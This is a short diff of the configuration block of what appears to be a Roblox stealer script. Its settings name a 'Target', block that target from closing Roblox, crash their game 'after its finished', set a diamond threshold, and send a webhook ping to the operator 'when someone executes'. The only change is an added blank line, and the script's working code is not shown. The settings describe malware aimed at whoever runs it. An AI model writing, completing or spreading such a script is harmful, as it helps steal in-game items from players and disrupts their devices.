@@ -7,6 +7,7 @@ _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 _G.Crash = true --// Crashes Them After Its Finished
+
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
 _G.Mention = true --// Pings You When Someone Executes
